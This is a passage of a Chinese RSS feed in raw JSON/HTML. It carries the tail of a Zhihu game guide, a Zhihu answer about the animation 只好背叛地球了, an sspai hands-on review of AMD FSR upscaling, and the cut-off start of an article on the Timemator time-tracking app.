href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/dEg4Ncn-kBxKIcwWw2_VEQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-1cf98f52913dedf2cba103d06e79fefe_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——尚食局（一）</a><a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/U-hQ6mfScTMmZz-cK-JefQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-0927d1adecb72d37b084ecc3b191f4e3_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——尚食局（二）</a><p><img src=\"https://pic2.zhimg.com/v2-edce438be3b4efc88ad67125b513fe06_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2388\" data-watermark=\"watermark\" data-original-src=\"v2-edce438be3b4efc88ad67125b513fe06\" data-watermark-src=\"v2-756e2bf45d07dcd507feedb087187cc2\" data-private-watermark-src=\"v2-0a93355311773bbdb5667ba73a9dae29\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-28387dac78b03cc6f64ed0066db1fb84_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"4006\" data-watermark=\"watermark\" data-original-src=\"v2-28387dac78b03cc6f64ed0066db1fb84\" data-watermark-src=\"v2-6c0545cfcea1f66aa2900a7236b8a37e\" data-private-watermark-src=\"v2-88c316e4485f87dd3ec2696f850ef4c7\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-b931fa449c02f64b5b039ba7c64eb4ef_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1205\" data-watermark=\"watermark\" data-original-src=\"v2-b931fa449c02f64b5b039ba7c64eb4ef\" data-watermark-src=\"v2-2b4b2284b14a24c9ec27326505d68761\" data-private-watermark-src=\"v2-4ec4326331c6a2ff17056d3209227cde\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-5361c22365683616085c99fc08c204bf_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1205\" data-watermark=\"watermark\" data-original-src=\"v2-5361c22365683616085c99fc08c204bf\" data-watermark-src=\"v2-de9b9dd5bab37f0dabe2830924d2b458\" data-private-watermark-src=\"v2-8bfabc18354a1f61c1dd2bab8dd9c92e\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-0d9dcd065e842ec893df455eafdcbcba_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1205\" data-watermark=\"watermark\" data-original-src=\"v2-0d9dcd065e842ec893df455eafdcbcba\" data-watermark-src=\"v2-74f624857cf6a85e23e59cea84afb4ce\" data-private-watermark-src=\"v2-4603adf3e7f7311e0a5dffdd83d8a172\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-493954ecfdc712036673414bd2b58640_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1170\" data-watermark=\"watermark\" data-original-src=\"v2-493954ecfdc712036673414bd2b58640\" data-watermark-src=\"v2-52fd07f6f42fcd7d4d8ddde32101b0d3\" data-private-watermark-src=\"v2-8661984a456b497360e50992c36cbc10\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f3f28ac9bcc4e74000ba20e2a3386ddc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1203\" data-watermark=\"watermark\" data-original-src=\"v2-f3f28ac9bcc4e74000ba20e2a3386ddc\" data-watermark-src=\"v2-80ae074f25785519d0dcc2242be9d972\" data-private-watermark-src=\"v2-8a45971d10a7943c8787bb8a33f2932d\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d9577838ba51ba1c06160a16ad450d53_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1236\" data-watermark=\"watermark\" data-original-src=\"v2-d9577838ba51ba1c06160a16ad450d53\" data-watermark-src=\"v2-5917e4ada9c72562daa05885763242fc\" data-private-watermark-src=\"v2-b7fcaa56c04db716f6fd4437b0551931\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c05b1a274d61bea2ea7f17ae37235951_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"582\" data-watermark=\"watermark\" data-original-src=\"v2-c05b1a274d61bea2ea7f17ae37235951\" data-watermark-src=\"v2-ee4e1b2fcdee2bef2cf43e7ca00a57f7\" data-private-watermark-src=\"v2-1b63ccf0bafbc6e4cbde8c58b39bcdd0\"></p>\n<hr>\n<h2><b>九、东厂线索合集</b></h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/GNVps2comkQYKAcg6vFjCw\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-6981a4aa542a001192b905caea0f24cf_l.jpg\" data-image-width=\"455\" data-image-height=\"455\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——路人线索篇</a><hr>\n<h2>十、密探</h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/a3qSHW5D3WnAYdMpLexX_A%3Fscene%3D21%23wechat_redirect\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-edf25d94ab427dc72502d4d393bf9be4_bh.jpg\" data-image-width=\"1105\" data-image-height=\"471\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">皇帝的成长计划攻略——密探</a><hr>\n<h2>十一、皇子珍宝</h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/kA5uXY4t6-F-ctJPH7YJDA\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-388bb2ea6feaa24c2d63e058ae835cbe_bh.jpg\" data-image-width=\"1232\" data-image-height=\"524\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">皇帝的成长计划攻略——皇子珍宝</a><hr>\n<h2>十二、飞贼</h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/k7X55B4k4VDnnypFozL_yQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-a9f278a78af6f3afe1aa95cfdb579ddb_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">皇帝的成长计划攻略——飞贼</a><hr>\n<h2>十三、策卡推荐（待更中）</h2>\n<h3>（一）五行谶纬</h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Bc_cT87uXv55VP15OwK_sg\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-40e2b0daaec64171783afca2bcbac268_bh.jpg\" data-image-width=\"1206\" data-image-height=\"513\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">皇帝的成长计划攻略——策卡之五行谶纬</a><hr>\n<p><i>还有问题的可以评论区问</i></p>\n<p><i>如果我可以回答我再总结过来</i></p>\n<p><i>谢谢你们点的赞同</i></p>\n<p><img src=\"https://pic3.zhimg.com/v2-7672a8bcd095d5eec04b36ae54d28d00_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"128\" data-rawheight=\"128\" data-watermark=\"watermark\" data-original-src=\"v2-7672a8bcd095d5eec04b36ae54d28d00\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<a data-draft-node=\"block\" data-draft-type=\"ad-link-card\" data-ad-id=\"fee_0de7ab2daf224ebf58578c2384719ff5\"></a><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/shi-yi-95-63-9?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">魔仙堡大美人</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/328462161/answer/986274203?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">135 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/376333917?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">游戏《烟雨江湖》应该怎么玩？有哪些攻略？</a><br><a href=\"http://www.zhihu.com/question/371309642?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">游戏《三国志14》应该怎么玩？有哪些攻略？</a><br>\n","link":"http://www.zhihu.com/question/328462161/answer/986274203?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价国产动画《只好背叛地球了》第 1 - 5 集？","date":"2021-06-29 11:30:07","description":"\n<p>评价自家的作品总显得有那么一丝囧~容我跑个题，稍微说一点创作的故事。</p>\n<p>《只好背叛地球了》是改编自抽纸小jin的同名漫画，在开始这个动画项目很久之前，我就已经是漫画的读者，很喜欢这部能哈哈哈地笑着看完的作品，并且还能从中感受到爱的暖意。所以有机会开始这个动画的创作，是含着原作党的爱意启程的。</p>\n<p>然后一顿改。（手动狗头）因为原作短篇体量的问题，编剧团队不得不加入大量的原创内容补足时长，而且我们还有一个对作品的高要求，就是要较为密集的抛梗，不好笑就是原罪，要一直搞笑也是很难的，所以创意导演和编剧团队一直在沙雕能量的增长和释放中左右横跳。</p>\n<p>刚刚也说除了欢乐，背球还想要延续漫画那种包含着爱的暖意的体验，因此后面也融入了许多都市年轻人的情感体验，对家庭对爱人对父母对工作和生活，来源真实情感改编，很多一起工作的小伙伴也会被动画中的这些情感所打动，背球讲了年轻人这一代自己的故事。在欢笑之余，还想给大家带来更多的感动，这是一点私心。</p>\n<p>制作上，一部搞笑泡面番讲究的点在于节奏节奏还是节奏，这对分镜创作有非常高的要求，这里为分镜导演掉下的头发默哀3秒。而且背球有比较长的制作规划，整体时长体量在泡面番中是非常大的~。节奏快体量大，这些对我们声影动漫背球团队来说都是制作难题，但很开心的是，小伙伴们享受动画创作的过程，在给成片效果添砖加瓦的过程中越做越好，完美体现了我们团队对这部作品的诚意。</p>\n<p>漫改动，我一直希望能做到让每一个载体都开一朵有些不一样的花，在一个ip下，即贴合原作，又让动画观众在去看过原作后 还有能被动画吸引住的一些不同的点。可能这算是动画人的执着吧。对于这部作品，我们得到了平台内部和有机会提前观看的观众的正面反馈，这恐怕是最开心的时刻。希望大家喜欢背球，希望大家的生活快乐而又充满爱。</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wang-miao-4-80-24?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">王淼</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/468570200/answer/1968823249?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/285001010?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怎样评价星游记下一部电影《星游记之冲出地球》？</a><br><a href=\"http://www.zhihu.com/question/51043844?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《吃货宇宙》？</a><br>\n","link":"http://www.zhihu.com/question/468570200/answer/1968823249?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"老显卡也能拥有的新体验：AMD FSR 实测","date":"2021-06-29 08:30:00","description":"\n<p>本周 PC 热门动态除了 Windows11 面世、显卡价格继续快速回落以外，还有就是 AMD 的超采样技术 FidelityFX Super Resolution（下文简称 FSR，超级分辨率锐画技术）的正式上线。</p>\n<p>作为伴随 RDNA2 显卡一同登场的 AMD 的光线追踪和 FSR 可以算是最让大家期待两个技术，光线追踪可以说目前和 RDNA2 显卡捆绑在一起；而普适性更强的FSR技术，也因为 AMD 的免费开放及开源支持旧卡甚至<strong>竞品</strong>，从而引发互联网的热议，那么这个技术到底会不会让 AMD 再次成为 yyds<sup class=\"ss-footnote\" href=\"\" title=\"永远的神\" footnote-id=\"1\">1</sup>，我也正好手握 Navi<sup class=\"ss-footnote\" href=\"\" title=\"Radeon RX 5000 系列\" footnote-id=\"2\">2</sup> 跟 Polaris<sup class=\"ss-footnote\" href=\"\" title=\"Radeon RX 500 系列\" footnote-id=\"3\">3</sup> 新旧两代卡，趁热实测下这款AMD的新品「防晒乳<sup class=\"ss-footnote\" href=\"\" title=\"FSR 是防晒乳的拼音首字母\" footnote-id=\"4\">4</sup>」。</p>\n<h2>FSR 的实现原理</h2>\n<p>FSR 和 DLSS 均采用了 <a href=\"https://www.zhihu.com/question/462609402/answer/1921160757\" target=\"_blank\">深度学习</a> 去计算画面，来实现从低分辨率渲染到高分辨率输出的「魔法」。而 FSR 和 DLSS 的不同之处在于，DLSS 会使用每一帧的前后帧去优化超采的结果， 而 FSR 只是单帧的图像超采算法，所以 FSR 可以不依赖特殊的处理单元（N 卡上的 Tensor Core）即可完成超分辨率的工作。</p>\n<p>FSR 主要由两个通道组成，一个是边缘自适应空间升频（EASU）的升频通道，它主要用于处理像素边缘的重建，这样才能在从低分辨率升频到高分辨率的同时保持边缘清晰。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/94801b177bc98b263e1ac6a19fb89f13\"><figcaption>不同的设置可以针对不同的边缘进行重建</figcaption></figure><p>另一个通道则是自适应强对比度锐化通道（RCAS），它会提取放大后图像中的细节进行智能锐化，从而获得更高像素、更清晰的的图像。</p>\n<p>而目前在这几个支持的游戏里面，画面设置菜单都有显著的 AMD FSR「FidelityFX Super Resolution」参数选项。开启后有 4 档设置可选，分别是超高质量「Ultra Quality」、质量「Quality」、均衡「Balance」以及性能「Performance」。这 4 个模式相对应的，就是 4 个不同的渲染倍数和扩展分辨率，从而对实际画面也产生速度及画质的影响。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/b31b47dec329d8a6127f7bbf7f6ce059\"><figcaption>FSR 不同的设置对应画面的关系</figcaption></figure><p>下面我们就一起看看 FSR 对游戏提升到底有多少。</p>\n<h2>测试环境与产品推荐</h2>\n<p>目前市面类似的技术还有大家已经挺熟悉的 DLSS，DLSS 从 1.0 到 2.0 的进化也是挺明显，当然目前最大的问题一个是普及率另外一个就是上手门槛了。除了这些超采样技术，游戏引擎自带的抗锯齿技术也一定程度可以实现类似的效果，所以很多时候还是要看实际表现。</p>\n<p>测试平台为了避免 CPU 瓶颈直接选了 618 期间大火的锐龙 9，其他配置包括：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/33f338dccb935499c1bd0cb49f7cc7fc\"><figcaption>本次测试的配置</figcaption></figure><p><strong>撼讯「红魔」Radeon RX 6800 XT</strong></p>\n<p>好不容易借到的高端卡，撼讯家的恶魔系列也算是非公A卡的代表了，<strong>「红魔」</strong>Radeon RX 6800 XT 采用了 16 相供电的非公版 PCB，以及三槽位 / 三风扇的外形设计（尾部穿透设计），视频口保留了一个 USB-C（很多非公都直接去掉），恶魔尾灯的设计也挺别。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/28e4413a42d82219a46070580075d7e1\"><figcaption>显卡</figcaption></figure><p><strong>微星 MAG X570 TOMAHAWK WIFI 战斧导弹</strong></p>\n<p>这款算是性价比的 X570，价格也跟类似规格的 B550 相当，属于良心性价比型号，供电规格强于不少同价位产品，所以我一直用它来搭配锐龙 9 超频使用，要不太浪费它的供电规格了。除了比较宽裕的功耗上限，微星目前比较稳定好用的 BIOS 以外，实际超频能力也不错，如果你不满足 B550 迫击炮，想添点预算强化下主板规格的话，确实可以考虑，任何规格的锐龙它都不怕。当然对比自家更高阶的型号，缺点大概就是 PCIe4.0 的 M.2 插槽只有一个。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/e7b3e5dadfcc288c072407a5330bf651\"><figcaption>主板</figcaption></figure><p><strong>分型工艺 Celsius+S36 Prisma 一体水冷散热器</strong></p>\n<p>毕竟处理器是锐龙 9，所以散热器的肯定越强越好，散热器是来自分型工艺的 Celsius+S36 Prisma ，虽然是小众型号但实际也是目前 360 一体水冷里面第一梯队性能表现，此外还有独特的设计，比如旋转冷头盖就可以直接切换水冷系统的转速模式（轻松切换静音），另外就是它独特的理线设计，也是目前我感觉设计最合理的方案之一，冷头部分可以告别了乱糟糟的线材。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/fc827dbb5d8a3f92962bd6f4dc882dc3\"><figcaption>散热器</figcaption></figure><p><strong>振华 LEADEX G 1000 电源</strong></p>\n<p>从去年底开始电源市场就有一个趋势，就是额定大功率电源的销量的提升，毕竟现在硬件平台 CPU 还有显卡对功耗要求越多，甚至连xhs上的用户都会要求建议配置千瓦级的电源。振华的 LG1000 就可以算是千瓦级的性价比型号，常年价格 1K 出头，相比白金认证版便宜了不少。</p>\n<p>支持 80PLUS 金牌/智能拔插全模组/智能温控/十年质保，而且白色/黑色同价，方便一些白色主机用户选择。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/8553a2043712e64eaeba424f5bd2ac37\"><figcaption>电源</figcaption></figure><p><strong>内存金士顿骇客神条Predator掠食者 DDR4 3600 8G*2</strong></p>\n<p>测试的内存来自金士顿的骇客神条 Predator 掠食者，这个系列也算经典了，不过后续因为品牌变动估计会有新品来替代。</p>\n<p><strong>SSD金士顿 NV1 2T</strong></p>\n<p>固态硬盘算是 NV1，当时主要看中 2T 的价格足够便宜，用来当游戏的仓库最合适不过的，毕竟 Epic的周周免费游戏，之前的硬盘完全不够用了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/ba5195ea07a1deb2df08c42ed48c8420\"><figcaption>硬盘和内存</figcaption></figure><p>测试游戏如下，目前支持 FSR 的游戏可以在这里 <a href=\"https://www.amd.com/zh-hans/technologies/radeon-software-fidelityfx-super-resolution#%E6%B8%B8%E6%88%8F\" target=\"_blank\">找到</a>：</p>\n<ul>\n<li>纪元1800</li>\n<li>银河破裂者</li>\n<li>众神陨落</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/50b2b94e877504d4f4bc2efa1150610a\"><figcaption>目前所支持的游戏</figcaption></figure><p>而目前暂时没有游戏同时支持 FSR 和 DLSS，故在下文中只有 FSR 的性能开启关闭的对比测试以及不同挡位的画面影响。</p>\n<h2>FSR 实测与结果对比</h2>\n<p>结果看图片，提升幅度够粗暴了吧，没有那种百分之几的提升，全部都是大幅度的速度提升。性能模式提升幅度基本都有翻倍。</p>\n<p>当然这边速度的提升，主要依靠降低实际渲染倍数然后通过算法尽量补充画面细节模拟原分辨率从而带来的提升，所以对实际游戏画面势必也会产生影响，而这个影响就跟游戏画面及算法都有关系。</p>\n<p>另外还有一个要注意的地方，就是随着FSR功能的开启，显存使用率也会降低，这对于老卡、核显也是特别有利的地方。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/ad023bbb2412e1bac5c2e97c62e7d165\"><figcaption>纪元 1800</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/7e485d9a2c12c2a60b19deca3a38f562\"><figcaption>银河破裂者</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/f402b7b2e6e51977963e92641ee55b3a\"><figcaption>众神陨落</figcaption></figure><h2>不同档位对画面的影响</h2>\n<p>前面说了这种加速方式对画面肯定会有影响，目前我们主要看的就是影响幅度多大，是否可以接受。</p>\n<p>我测试的时候特意外接 4K 大屏电视测试，分辨率跟实际可视画面大小都比较适合观察。其实主观看的话，对画面的影响还是可以感觉到，不过不同游戏甚至不同类型画面影响幅度不同，特别是默认画面跟超级质量之间的画面差异还特别小，所以最好自己实际测试来感知下大概哪个档位比较适合你。不过说真的，AMD 给预设的档位真的太多了，我测试都要累死了。</p>\n<p>画面只看缩略图其实感觉不大明显，因为网络本身也会压缩，所以只能局部 100% 放大对比。</p>\n<p>局部放大对比，比如众神陨落这个起始画面来看，影响比较明显是其实反倒是背景画面，默认画面哪怕是背景细节都是完整的，可以看到细节边缘，随着FSR档位的调整，越靠近速度档位画面的涂抹感就越强，不过哪怕到最强调速度的性能档位，大致轮廓还是比较清晰的，而且这还是局部细节，控制到这个结果还 OK。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/16e657953ce80ec72279145fdd623900\"><figcaption>远景细节对比</figcaption></figure><p>这个位置主要就是看头发跟地面的纹路细节。其实超级质量保留的图像信息挺不错，跟全默认感觉差异确实很小，就是太过锐化细节边缘。而越往后，可以感觉头发越粘成在一起了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/2932bd58d52a2d8c54693dd545f4da50\"><figcaption>发丝和地面的细节变化对比</figcaption></figure><p>另外不同类型甚至不同场景画面，FSR 影响程度的主观感觉也不同，所以尽量要自己体验感受下。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/af5850b0d0ed937eec1b22d19e570630\"><figcaption>金属纹路的细节变化对比</figcaption></figure><h2>如何体验 FSR</h2>\n<p>想要体验 AMD FSR 技术的方法很简单：</p>\n<ol>\n<li>确认自己的 GPU（显卡）在下面 <a href=\"https://www.amd.com/zh-hans/technologies/radeon-software-fidelityfx-super-resolution\" target=\"_blank\">支持表</a>；</li>\n<li>AMD 用户下载最新的 21.6.1 版驱动；</li>\n<li>Steam 下载 <a href=\"https://store.steampowered.com/app/780310/The_Riftbreaker/?l=schinese\" target=\"_blank\">银河破裂者</a> 这款免费体验的游戏。</li>\n</ol>\n<p>三个步骤都搞定后，你就可以开始体验 AMD FSR 技术带来的了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/6468c77187f20f92b649adba60ef8713\"><figcaption>目前支持的显卡</figcaption></figure><h2>总结</h2>\n<p>毕竟 FSR 目前还是 1.0 版本，所以测试之前个人就有大概的预期，测试结果也基本符合：速度表现很直接很暴力，实际画面算法表现还有进步空间，但是关键在「免费」。</p>\n<p>AMD 目前对于技术的市场推广真的挺聪明，大家还可以回想起之前另外两个技术，一个是「FreeSync」，一个是「SAM<sup class=\"ss-footnote\" href=\"\" title=\"AMD 显存智取技术\" footnote-id=\"5\">5</sup>」。技术先进程度是一回事，技术运用本身 AMD 都没有故意拉高门槛特别是拒绝老用户，后续就是这两个技术都变为市场「标配」了，这就是格局。最后还是综合说下目前对 AMD FSR 的使用总结：</p>\n<p>首先，先不讨论效果的进一步优化空间，「FSR」实际目前最大的问题在于支持的游戏的数量，支持的游戏多了，就说明市场的认可程度。目前首发的几款游戏说真的都稍微小众了点，还是期待后续其它游戏，特别是用户群体比较大的网游类型游戏。</p>\n<p>想要让自己喜欢的游戏支持的话，赶紧去 AMD 官网留言哈！！！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/6849131997a18706a4ac3c3621bcbb52\"><figcaption>即将支持的游戏</figcaption></figure><p>其次就是免费及开源。任何技术要推广降低用户上手门槛都可以说是王道，所以 AMD 也很直接的免费及开源技术方案，方便开发者运用，而且目前包含微软、索尼也都对该技术感兴趣，未来说不定也会跟 FreeSync 一样成为各类游戏项目的标配。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/a0aaed6a27fd480ab905288384ee476a\"><figcaption>同样即将开源</figcaption></figure><p>再者支持旧卡甚至竞品。早期还在传闻 AMD 的 FSR 可能仅限支持 RX5X0 及以上的卡，现在实际的支持情况简直太有爱了吧，甚至包含 APU 还有竞品。这对老卡还有众多的 APU 用户（比如锐龙本）简直太友好了，毕竟是直接提升速度的技术，这就是格局。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/814a9f9c83b055fb7059fc74367ead7d\"><figcaption>支持旧显卡和竞品显卡</figcaption></figure><p>那么旧卡速度提升如何？我这边也实际用了一张 RX590GME 在 4K（1440P) 分辨率下测试，测试结果如下，速度提升幅度跟新卡无异，也让这张稍微入门的卡实现了 4K 60 FPS 的帧数，让我们一起喊出那六个字母！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/c11f8d80964c43566d26ee3636c330b3\"><figcaption>RX 590 在 4K 画面下的表现</figcaption></figure><p>最后速度 OK，虽然画面算法还有进一步提升空间，这个不单要直接跟竞品「大力水手 2.0」做对比，还要跟 TAA 之类游戏引擎自带方案对比，所以也期待加快技术的进化。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67469"},{"title":"强大和易用并存的时间记录应用：Timemator","date":"2021-06-29 07:24:25","description":"\n<p>一件事情不压到最后一刻就是不做；无法在约定的时间内完成任务，总是寻找到借口推脱；忙忙碌碌一整天，却感觉没做什么有价值的事情。我们时常感觉时间不够用，却不知一天中有大量时间被我们白白浪费。</p>\n<p>造成这种结果最主要的原因就是<strong>没有做好时间规划</strong>。</p>\n<p>怎么才能做好时间规划呢？除了践行各种任务管理、日程管理方法之外，还有另一个选择：践行时间记录。</p>\n<h2>时间记录的意义是合理规划时间</h2>\n<p>时间记录是一种时间管理的「笨办法」，它用一种近乎不用思考的方式，潜移默化培养着我们的时间意识，引导着我们一步一步规划自己的时间。</p>\n<p>有别于任务管理、日程管理这种自上而下的时间管理方法，时间记录是自下而上一步一步优化时间分配。通过统计我们的任务执行情况，客观地跟自己任务优先级进行对比。</p>\n<p>但同时，我们还是需要一些自上而下的思考。需要知道事情的优先次序，知道自己手头事项的紧急与否。正如柳比歇夫在《奇特的一生》书中所说：</p>\n<blockquote><p>如果每个人都能知道自己能干些什么，那生活会变得多么美好！因为每个人的能力都比他自己感觉到的大得多，也就不会有那么多的人感叹自己因能力有限而导致一事无成。</p></blockquote>\n<p>时间记录的美妙就在于此。<strong>通过一点一滴的记录强化时间管理，不追求能多完成几个任务，而在意时间规划的合理性，让一切都能按预期的方式进行</strong>。久而久之，势必带来巨大的改变，而这一切也要归功于合理规划时间。</p>\n<p>柳比歇夫的时代主要依靠纸笔记录时间，而现在的我们完全可以将这个繁琐的事情简单化，让践行时间记录更轻松惬意。在尝试了诸如 Timetrack.io、Toggl track 这些时间记录工具后，我最终选择了 Timemator。</p>\n<h2>使用 Timemator 记录时间</h2>\n<p>Timemator 是一款 Mac、iOS 双平台的时间自动记录应用，它会自动捕获你在 Mac 上所做的一切，只需点击几下即可将这些活动分配到对应的任务上，极大提高时间记录的效率。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/article/3f9cc3e34d7a1e866f45eae44ed04c92\"></figure><p>不同于其他时间记录工具，Timemator 是一个状态栏程序，它没有独立的主窗口界面，所有操作都通过点击状态栏图标弹出的小窗口实现。因此你可以在任何时候从状态栏快速操作它。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/04/29/article/dec41936ee0fd7da017b492a3cccd3cc\"></figure><p>Timemator 的使用流程非常简单：你只需要点击左下角的「+」添加时间事项或文件夹，再点击事项左侧的开始按钮就可以启动计时。在积累了一些记录之后，点击界面底部的「Reports」按钮打开统计功能，即可查看自己的时间统计报告。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/04/29/article/27a7877ff2041227ccd71249feed3d1f\"></figure><h2>划定使用场景，设置时间事项</h2>\n<p>在开始记录之前，最重要的工作是设置自己的时间事项。</p>\n<p>居家、工作、休闲娱乐、交通、吃饭、睡觉，这几类基本能涵盖大多数人一天所做了。而具体的设置，可以围绕这几类事项进行扩展，根据自己重点关注的事项进一步细化。</p>\n<p>例如你比较关注吃饭的时间，可以在居家这个场景下，明确增加吃饭这个任务，其他不太关注的比如做家务、做饭，就可以直接用居家这个大类概括。这样做的好处是降低记录的频率，聚焦重点事项。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/04/29/article/c2fcc7d156eeaf514456068b0163cb85\"></figure><p>在 Timemator 